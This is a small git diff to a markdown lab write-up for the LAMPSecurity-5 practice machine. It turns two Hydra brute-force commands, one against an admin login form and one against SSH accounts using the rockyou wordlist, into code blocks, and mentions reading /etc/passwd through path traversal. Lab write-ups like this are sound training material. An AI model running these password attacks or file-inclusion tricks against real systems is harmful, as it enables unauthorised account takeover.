@@ -22,8 +22,10 @@ At the the Blog menu there is a admin panel authenticity.
   <img src="https://rajoul.github.io/my_write_up/image/LAMPSecurity-5/admin_panel.png" width="800" height="230">
 </p>
 the first thing I do is brute forcing the credentials with Hydra'tool.
-**hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.4.13 http-post-form "/~andy/data/nanoadmin.php?:user=^USER^&pass=^PASS^:
-wrong Username or Password" -V -t 10**
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.4.13 http-post-form "/~andy/data/nanoadmin.php?:user=^USER^&pass=^PASS^:
+wrong Username or Password" -V -t 10
+```
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/LAMPSecurity-5/hydra.png" width="800" height="230">
 </p>
@@ -56,7 +58,9 @@ At the image below,I was be able to include **/etc/passwd** file through path tr
 </p> 
 The file dispaly 5 different system'users,first i tried to brute force every password user to login with ssh. the file users contain the 
 5 users(amy,patrick,....)
-**hydra -L users -P /usr/share/wordlists/rockyou.txt 10.0.4.13 ssh -V**
+```
+hydra -L users -P /usr/share/wordlists/rockyou.txt 10.0.4.13 ssh -V
+```
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/LAMPSecurity-5/amy_ssh.png" width="800" height="130">
 </p> 
